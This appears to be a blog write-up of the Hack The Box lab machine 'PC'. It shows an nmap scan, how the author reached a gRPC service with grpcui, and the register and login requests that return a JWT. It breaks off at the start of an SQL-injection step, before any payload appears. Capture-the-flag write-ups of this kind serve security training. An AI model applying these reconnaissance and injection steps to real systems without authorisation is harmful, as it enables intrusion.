@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>HTB Writeup - PC (Easy) :: CyberSpider</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Writeup of PC from Hack The Box." />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="/posts/pc/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/styles.css">
+
+
+
+<link rel="stylesheet" href="/style.css">
+
+
+
+  <link rel="shortcut icon" href="/img/theme-colors/green.png">
+  <link rel="apple-touch-icon" href="/img/theme-colors/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="CyberSpider" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="HTB Writeup - PC (Easy)">
+<meta property="og:description" content="Writeup of PC from Hack The Box." />
+<meta property="og:url" content="/posts/pc/" />
+<meta property="og:site_name" content="CyberSpider" />
+
+  
+    <meta property="og:image" content="/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2023-09-04 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    cyberspider@ubuntu:~$
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/archive">archive</a></li>
+        
+      
+        
+          <li><a href="/whoami">whoami</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/archive" >archive</a></li>
+        
+      
+        
+          <li><a href="/whoami" >whoami</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="/posts/pc/">HTB Writeup - PC (Easy)</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2023-09-04</time><span class="post-author">CyberSpider</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="/tags/htb/">htb</a>&nbsp;
+      
+      #<a href="/tags/easy/">easy</a>&nbsp;
+      
+      #<a href="/tags/linux/">linux</a>&nbsp;
+      
+      #<a href="/tags/rce/">RCE</a>&nbsp;
+      
+      #<a href="/tags/grpc/">gRPC</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <p>The <code>PC</code> machine is an easy linux box.</p>
+<p><img src="/images/PC.png#center" alt="Scenario 1: Across columns"></p>
+<h2 id="nmap-scan">Nmap Scan<a href="#nmap-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I do a <code>nmap scan</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -p- -sC -sV --min-rate <span style="color:#ae81ff">5000</span> 10.10.11.214 -Pn           
+</span></span><span style="display:flex;"><span>Starting Nmap 7.94 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-09-02 16:48 EDT
+</span></span><span style="display:flex;"><span>Stats: 0:00:03 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Connect Scan
+</span></span><span style="display:flex;"><span>Connect Scan Timing: About 5.33% <span style="color:#66d9ef">done</span>; ETC: 16:49 <span style="color:#f92672">(</span>0:00:53 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Stats: 0:00:07 elapsed; <span style="color:#ae81ff">0</span> hosts completed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> up<span style="color:#f92672">)</span>, <span style="color:#ae81ff">1</span> undergoing Connect Scan
+</span></span><span style="display:flex;"><span>Connect Scan Timing: About 13.93% <span style="color:#66d9ef">done</span>; ETC: 16:49 <span style="color:#f92672">(</span>0:00:43 remaining<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.11.214
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.12s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65533</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE VERSION
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>50051/tcp open  unknown
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span style="display:flex;"><span>SF-Port50051-TCP:V<span style="color:#f92672">=</span>7.94%I<span style="color:#f92672">=</span>7%D<span style="color:#f92672">=</span>9/2%Time<span style="color:#f92672">=</span>64F39FD0%P<span style="color:#f92672">=</span>x86_64-pc-linux-gnu%r<span style="color:#f92672">(</span>NU
+</span></span><span style="display:flex;"><span>SF:LL,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x06
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GenericL
+</span></span><span style="display:flex;"><span>SF:ines,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>GetReq
+</span></span><span style="display:flex;"><span>SF:uest,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>HTTPOp
+</span></span><span style="display:flex;"><span>SF:tions,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RTSPR
+</span></span><span style="display:flex;"><span>SF:equest,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>RPCC
+</span></span><span style="display:flex;"><span>SF:heck,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\xff\xff\0\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSVer
+</span></span><span style="display:flex;"><span>SF:sionBindReqTCP,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\?\x
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:ff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0\0&#34;</span>
+</span></span><span style="display:flex;"><span>SF:<span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>DNSStatusRequestTCP,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\0\?\0\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Help,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05\0\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\?\0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SSLSessionReq,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\xff\0\x05
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0\0\0\0\0\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:?\0\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TerminalServerCookie,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:0\0\0\0\0\?\0\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>TLSSessionReq,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:xff\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\0\0\0\0\0\0\?\0\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>Kerberos,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\0\0\0\0\0\?\0\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>SMBProgNeg,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xf
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:f\xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\0\0\0\0\0\?\0\0&#34;</span><span style="color:#f92672">)</span>%r<span style="color:#f92672">(</span>X11Probe,2E,<span style="color:#e6db74">&#34;\0\0\x18\x04\0\0\0\0\0\0\x04\0\?\xff\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:xff\0\x05\0\?\xff\xff\0\x06\0\0\x20\0\xfe\x03\0\0\0\x01\0\0\x04\x08\0\0
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">SF:\0\0\0\0\?\0\0&#34;</span><span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 45.86 seconds
+</span></span></code></pre></div><p>I do any research and I discover that the 50051 port is to <code>gRPC</code></p>
+<h2 id="grpc">gRPC<a href="#grpc" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I find this tool <code>https://github.com/fullstorydev/grpcui</code> to interact with this service, I download it form this site <code>https://github.com/fullstorydev/grpcui/releases/tag/v1.3.1</code> , and I unzip the file:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ tar -xvf grpcui_1.3.1_linux_x86_64.tar.gz
+</span></span><span style="display:flex;"><span>LICENSE
+</span></span><span style="display:flex;"><span>grpcui
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span>  grpcui    grpcui_1.3.1_linux_x86_64.tar.gz
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Downloads<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cd /home/kali                               
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cp ~/Downloads/grpcui .                            
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ls
+</span></span><span style="display:flex;"><span> grpcui  
+</span></span></code></pre></div><p>I connect to the service:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ./grpcui -plaintext 10.10.11.214:50051
+</span></span><span style="display:flex;"><span>gRPC Web UI available at http://127.0.0.1:33231/
+</span></span><span style="display:flex;"><span>Missing chrome or resource URL: resource://gre/modules/UpdateListener.jsm
+</span></span><span style="display:flex;"><span>Missing chrome or resource URL: resource://gre/modules/UpdateListener.sys.mjs
+</span></span></code></pre></div><p>I do the <code>Register User</code>:</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /invoke/SimpleApp.RegisterUser <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0.0.1:37013</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">65</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua<span style="color:#f92672">:</span><span style="color:#ae81ff"> </span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-mobile<span style="color:#f92672">:</span> <span style="color:#ae81ff">?0</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
+</span></span><span style="display:flex;"><span>X-Requested-With<span style="color:#f92672">:</span> <span style="color:#ae81ff">XMLHttpRequest</span>
+</span></span><span style="display:flex;"><span>x-grpcui-csrf-token<span style="color:#f92672">:</span> <span style="color:#ae81ff">lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-platform<span style="color:#f92672">:</span> <span style="color:#ae81ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://127.0.0.1:37013</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#f92672">:</span> <span style="color:#ae81ff">same-origin</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#f92672">:</span> <span style="color:#ae81ff">cors</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#f92672">:</span> <span style="color:#ae81ff">empty</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://127.0.0.1:37013/</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">_grpcui_csrf_token=lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;metadata&#34;</span>:[],<span style="color:#f92672">&#34;data&#34;</span>:[{<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;cyber&#34;</span>,<span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;spider&#34;</span>}]}
+</span></span></code></pre></div><p>I do the <code>Login User</code>:</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /invoke/SimpleApp.LoginUser <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0.0.1:37013</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">65</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua<span style="color:#f92672">:</span><span style="color:#ae81ff"> </span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-mobile<span style="color:#f92672">:</span> <span style="color:#ae81ff">?0</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
+</span></span><span style="display:flex;"><span>X-Requested-With<span style="color:#f92672">:</span> <span style="color:#ae81ff">XMLHttpRequest</span>
+</span></span><span style="display:flex;"><span>x-grpcui-csrf-token<span style="color:#f92672">:</span> <span style="color:#ae81ff">lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-platform<span style="color:#f92672">:</span> <span style="color:#ae81ff">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://127.0.0.1:37013</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Site<span style="color:#f92672">:</span> <span style="color:#ae81ff">same-origin</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Mode<span style="color:#f92672">:</span> <span style="color:#ae81ff">cors</span>
+</span></span><span style="display:flex;"><span>Sec-Fetch-Dest<span style="color:#f92672">:</span> <span style="color:#ae81ff">empty</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://127.0.0.1:37013/</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
+</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">_grpcui_csrf_token=lE7ta9mOmKAoi2wdiRyRk2bDv2txFi_GzZrNA0zCuHU</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#f92672">&#34;metadata&#34;</span>:[],<span style="color:#f92672">&#34;data&#34;</span>:[{<span style="color:#f92672">&#34;username&#34;</span>:<span style="color:#e6db74">&#34;cyber&#34;</span>,<span style="color:#f92672">&#34;password&#34;</span>:<span style="color:#e6db74">&#34;spider&#34;</span>}]}
+</span></span></code></pre></div><ul>
+<li>Response:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> <span style="color:#a6e22e">OK</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
+</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Sun, 03 Sep 2023 19:18:23 GMT</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">587</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;headers&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;content-type&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;application/grpc&#34;</span>
+</span></span><span style="display:flex;"><span>    },
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;grpc-accept-encoding&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;identity, deflate, gzip&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ],
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;error&#34;</span>: <span style="color:#66d9ef">null</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;responses&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;message&#34;</span>: {
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;message&#34;</span>: <span style="color:#e6db74">&#34;Your id is 517.&#34;</span>
+</span></span><span style="display:flex;"><span>      },
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;isError&#34;</span>: <span style="color:#66d9ef">false</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ],
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;requests&#34;</span>: {
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;total&#34;</span>: <span style="color:#ae81ff">1</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;sent&#34;</span>: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>  },
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;trailers&#34;</span>: [
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;name&#34;</span>: <span style="color:#e6db74">&#34;token&#34;</span>,
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">&#34;value&#34;</span>: <span style="color:#e6db74">&#34;b&#39;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiY3liZXIiLCJleHAiOjE2OTM3Nzg3MDV9.Y7QoF88uPDaFgX8vZRxFUfChyFOyP9g7t6sAzxDOrMY&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>I see the <code>id</code> and the <code>token</code></p>
+<h2 id="sqli">SQLi<a href="#sqli" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>I go in <code>Method name</code> ,  I select <code>getinfo</code>, I insert id and token and click <code>Invoke</code>:</p>
+<ul>
+<li>Request:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /invoke/SimpleApp.getInfo <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">127.0.0.1:37013</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">191</span>
+</span></span><span style="display:flex;"><span>sec-ch-ua<span style="color:#f92672">:</span><span style="color:#ae81ff"> </span>
+</span></span><span style="display:flex;"><span>sec-ch-ua-mobile<span style="color:#f92672">:</span> <span style="color:#ae81ff">?0</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
